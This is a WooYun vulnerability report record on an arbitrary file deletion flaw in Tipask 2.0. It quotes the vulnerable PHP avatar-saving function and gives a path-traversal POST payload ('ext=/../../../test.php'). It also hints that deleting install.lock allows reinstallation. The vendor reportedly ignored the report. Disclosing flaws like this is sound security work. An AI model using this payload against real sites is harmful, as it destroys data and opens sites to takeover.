{"id": 9474, "wybug_id": "wooyun-2013-026781", "wybug_title": "Tipask 2.0 前台任意文件删除漏洞", "wybug_corp": "Tipask", "wybug_author": "猪头子", "wybug_date": "2013-06-24 16:31", "wybug_open_date": "2013-09-22 16:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-09-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： * tipask可以调整头像保存并删除原始头像* 在删除原始头像时使用了post提交的参数* 造成任意文件删除漏洞 详细说明：  \nfunction onsaveimg() {        $x1 = $this-> post['x1' ];        $y1 = $this-> post['y1' ];        $x2 = $this-> post['x2' ];        $y2 = $this-> post['y2' ];        $w = $this-> post['w' ];        $h = $this-> post['h' ];        $ext = $this-> post['ext' ];        $upload_tmp_file = TIPASK_ROOT . \"/data/tmp/\" . 'bigavatar' . $this->user['uid' ] . $ext;        $avatardir = \"/data/avatar/\"; //图片存放目录        $scale = 100 / $w;        resizeThumbnailImage( $smallimg, $upload_tmp_file, $w, $h, $x1, $y1, $scale);        copy($upload_tmp_file, TIPASK_ROOT . $dir3 . '/big_' . $uid . $ext);        is_file($upload_tmp_file) && unlink($upload_tmp_file);        $_ENV[ 'user']->update_avatar($smallimg);        $this->message( '头像设置成功！' , 'user/editimg' );    }\n可以看到onsaveimg函数直接调用post的ext参数并传入到$upload_tmp_file中，最后进入unlink。造成任意文件删除漏洞。   漏洞证明：  删除根目录下的test.phppost ext=/../../../test.php 到?user/saveimg.html其实可以删除install.lock你们懂的   修复方案：  坐等忽略   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}